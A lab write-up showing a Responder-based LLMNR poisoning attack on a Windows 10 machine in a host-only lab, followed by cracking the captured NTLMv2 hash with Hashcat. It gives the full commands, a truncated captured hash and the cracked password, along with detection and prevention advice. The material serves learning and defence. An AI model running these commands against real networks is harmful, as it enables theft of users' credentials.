# LLMNR Poisoning Attack

**Date:** May 2026 <br> 
**Author:** ShahinSecLab <br> 
**Category:** Credential Access <br> 
**Difficulty:** Easy <br> 
**Tools:** Responder, Hashcat

## Table of Contents

- [Introduction](#introduction)
- [Attack Flow](#attack-flow)
- [Why This Attack Works](#why-this-attack-works)
- [Lab Setup](#lab-setup)
- [Tools Used](#tools-used)
- [Prerequisites](#prerequisites)
- [Step 1 — Checking My IP Address](#step-1--checking-my-ip-address)
- [Step 2 — Starting Responder](#step-2--starting-responder)
- [Step 3 — Triggering the Request from the Victim](#step-3--triggering-the-request-from-the-victim)
- [Step 4 — Saving the Captured Hash](#step-4--saving-the-captured-hash)
- [Step 5 — Cracking the Captured Hash](#step-5--cracking-the-captured-hash)
- [How Defenders Can Catch This](#how-defenders-can-catch-this)
- [How to Prevent It](#how-to-prevent-it)
- [References](#references)
- [Lessons Learned](#lessons-learned)

## Introduction

LLMNR stands for **Link-Local Multicast Name Resolution**.

Windows uses LLMNR when it cannot find a computer name through DNS. If DNS cannot find the computer, Windows asks other devices on the same network if they know it.

The problem is that any device on the network can reply. An attacker running Responder can pretend to be the requested computer and capture the victim's NTLMv2 password hash.

If the password is weak, the hash can be cracked to recover the password.

## Attack Flow

```
Victim Tries to Access a Shared Folder
                ↓
DNS Lookup Fails
                ↓
Windows Sends an LLMNR Broadcast
                ↓
Responder Replies to the Request
                ↓
Victim Sends NTLMv2 Authentication
                ↓
Responder Captures the NTLMv2 Hash
                ↓
Save the Hash
                ↓
Crack the Hash with Hashcat
                ↓
Recover the Password
```

## Why This Attack Works

This attack works because **LLMNR is enabled by default** on many Windows systems.

When DNS cannot find a computer name, Windows sends an LLMNR request on the local network asking if any device knows that name.

Responder listens for these requests and quickly replies, pretending to be the requested computer.

The victim trusts the reply and tries to authenticate. During this process, the victim sends an **NTLMv2 password hash**, which Responder captures.

If the password is weak, the captured hash can be cracked offline using a tool like Hashcat.

## Lab Setup

| Component | Details |
|-----------|---------|
| Attacker Machine | Kali Linux |
| Victim Machine | Windows 10 |
| Attacker IP | `192.168.5.128` |
| Victim IP | `192.168.5.136` |
| Network | VirtualBox Host-Only Network |

## Tools Used

| Tool | Purpose |
|------|---------|
| `Responder` | Captures `NTLMv2` hashes by responding to `LLMNR`, `NBT-NS`, and `mDNS` requests |
| `Hashcat` | Cracks captured `NTLMv2` password hashes using a wordlist |
| `rockyou.txt` wordlist | Used to guess the password |

## Prerequisites

| What | Why |
|------|-----|
| Kali Linux machine | Attacker machine with required penetration testing tools installed |
| Windows victim machine | Target machine for testing LLMNR poisoning |
| Active Directory environment | Provides Windows authentication and NTLMv2 authentication flow |
| LLMNR enabled on the network | Required for the attack to capture authentication requests |
| Network connectivity between machines | Required for communication during the attack |
| User account with network authentication activity | Needed to generate NTLMv2 authentication requests |
| Authorization to perform the test | Ensures the assessment is performed legally |

## Step 1 — Checking My IP Address

Before starting Responder, I first identified my network interface name and IP address.

```bash
ip a
```
**Breakdown**

|    Part   |     Meaning       |
|-----------|-------------------|
| `ip`      | The tool itself, used to show and manage network interfaces, addresses, and routing on Linux |
| `a`       | Short for `address`, shows IP addresses assigned to all network interfaces                   |

**Output:**

```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:77:a3:b1 brd ff:ff:ff:ff:ff:ff
    inet 192.168.5.128/24 brd 192.168.5.255 scope global dynamic noprefixroute eth0
       valid_lft 1773sec preferred_lft 1773sec
    inet6 fe80::f0be:d0bb:2c16:64f0/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

<p align="center">
  <img src="/Active-Directory/01-llmnr-poisoning/images/step1.png" width="600">
</p>

## Step 2 — Starting Responder

After identifying my network interface, I launched Responder to listen for LLMNR, NBT-NS, and WPAD requests on the network.

```bash
sudo responder -I eth0 -dwv
```
**Breakdown**

|    Part   |     Meaning       |
|-----------|-------------------|
| `-I eth0`   | Network interface |
|    `-d`     | DHCP poisoning    |
|    `-w`     | WPAD proxy server |
|    `-v`     | Verbose mode      |

**Output:**

```
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]

[+] Generic Options:
    Responder IP               [192.168.5.128]

[+] Listening for events...
```

Responder is now running and waiting for LLMNR, NBT-NS, and WPAD requests from devices on the network. When a victim sends a name resolution request, Responder can respond and capture the NTLM authentication information.

<p align="center">
  <img src="/Active-Directory/01-llmnr-poisoning/images/step2.png" width="600">
</p>

## Step 3 — Triggering the Request from the Victim

On the victim machine, I opened File Explorer and typed:

```
\\fakeshare
```

Since fakeshare does not exist, Windows could not find it through DNS and sent an LLMNR request on the network.

**In my lab, the victim machine name was VICTIM-2**.

<p align="center">
  <img src="/Active-Directory/01-llmnr-poisoning/images/step3-1.png" width="600">
</p>

Windows first tried DNS, but it could not find the hostname. It then sent an LLMNR request on the network, which was captured by Responder.

### Captured Credentials

On my Kali machine, Responder captured the victim's NTLMv2 authentication attempt and displayed the following information:

```
[SMB] NTLMv2-SSP Client   : fe80::1ba4:8be8:5787:2d63
[SMB] NTLMv2-SSP Username : VICTIM-2\karim
[SMB] NTLMv2-SSP Hash     : karim::VICTIM-2:9265e4bef71c4923:19C4EB1DD7F5B53D853808B81F0EBCE4:0101000000000000E6DC0135AE1EB0200080 .... (full hash)...
```

<p align="center">
  <img src="/Active-Directory/01-llmnr-poisoning/images/step3-2.png" width="600">
</p>

## Step 4 — Saving the Captured Hash

### Copied the Hash

First, I copied the NTLMv2 hash captured by Responder.

<p align="center">
  <img src="/Active-Directory/01-llmnr-poisoning/images/step4-1.png" width="600">
</p>

### Created a File for the Hash

On my Kali machine, I created a new file using `Nano`:

```bash
nano hash.txt
```

### Opened the File

After running the command, I pressed Enter to open the file.

<p align="center">
  <img src="/Active-Directory/01-llmnr-poisoning/images/step4-2.png" width="600">
</p>

### Pasted the Hash

Once Nano opened, I pasted the captured NTLMv2 hash into the file.

<p align="center">
  <img src="/Active-Directory/01-llmnr-poisoning/images/step4-3.png" width="600">
</p>

### Saved the File

To save the file, I pressed:

```bash
Ctrl + X
Y
Enter
```

This saved the hash to hash.txt, which I used in the next step for password cracking.

## Step 5 — Cracking the Captured Hash

After saving the NTLMv2 hash, I used Hashcat with the RockYou wordlist to try and recover the password.

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
**Breakdown**

```
|             Part                 |                   Meaning                     |
| -------------------------------- | --------------------------------------------- |
| hashcat                          | Password cracking tool                        |
| -m 5600                          | Hash type (NTLMv2 hash mode)                  |
| hash.txt                         | File containing captured hashes               |
| /usr/share/wordlists/rockyou.txt | Wordlist used for dictionary attack (rockyou) |
```

After a short time, Hashcat successfully cracked the password and displayed the result.

**Output:**

```
KARIM::VICTIM-2:08c4e1b5073681c1:7acce8f5708e0b1ea3bcbcf99f26fa01:10101000000000011
0003050242c6fd:01ea99382479946200308001004c0000000200040043004600310035003900300000
100040046003100350039003000000003002400430046....:Password1                                                                                    
```
### Cracked Password

```text
Password1
```

<p align="center">
  <img src="/Active-Directory/01-llmnr-poisoning/images/step5.png" width="600">
</p>

This confirmed that the captured NTLMv2 hash could be cracked using a common wordlist because the password was weak.

## How Defenders Can Catch This

| What to Check | What It May Show |
|---------------|------------------|
| LLMNR and NBT-NS traffic | Unexpected name requests and replies on the network |
| Responder activity | One device answering many name requests |
| Failed name lookups | Systems trying to reach names that do not exist |
| NTLM authentication logs | Users sending NTLM authentication to unexpected devices |
| Network monitoring tools | Unusual LLMNR, NBT-NS, or mDNS traffic |
| Endpoint security alerts | Tools like Responder running on a device |

## How to Prevent It

**Disable LLMNR**

Disable LLMNR through Group Policy to stop systems from using insecure name resolution:

```
Group Policy Editor → Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution → Enabled
```

**Disable NBT-NS if not required**

Disable NetBIOS Name Service to remove another way attackers can poison name requests.

```
Network Adapter Settings → IPv4 Properties → Advanced → WINS → Disable NetBIOS over TCP/IP
```

**Enable SMB Signing**

SMB signing helps prevent attackers from relaying captured authentication requests.

```
Group Policy → Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → Microsoft network server: Digitally sign communications (always)
```

**Use strong passwords**

Strong passwords make it harder for attackers to crack captured NTLMv2 hashes.

```
Use long passwords with a mix of letters, numbers, and symbols
```

**Use Multi-Factor Authentication (MFA)**

MFA adds an extra security layer if a user's password is compromised.

**Monitor network traffic**

Use network monitoring tools to detect unusual LLMNR, NBT-NS, and NTLM authentication activity.

**Disable NTLM where possible**

Use modern authentication methods like Kerberos instead of older NTLM authentication.

## References

| Resource | Link |
|----------|------|
| Microsoft Documentation — LLMNR and Name Resolution Security | https://learn.microsoft.com/en-us/windows-server/networking/dns/what-is-name-resolution |
| Responder GitHub Repository | https://github.com/lgandx/Responder |
| Hashcat Official Website | https://hashcat.net/hashcat/ |
| MITRE ATT&CK — LLMNR/NBT-NS Poisoning and SMB Relay | https://attack.mitre.org/techniques/T1557/001/ |
| TCM Security — Practical Ethical Hacking | https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course |

## Lessons Learned

- Learned how LLMNR poisoning works and why insecure name resolution can be dangerous.
- Learned how attackers can capture NTLMv2 hashes using Responder.
- Learned how password strength affects the security of captured hashes.
- Learned how Hashcat can be used to test password strength.
- Learned how disabling LLMNR and improving authentication security can reduce this attack risk.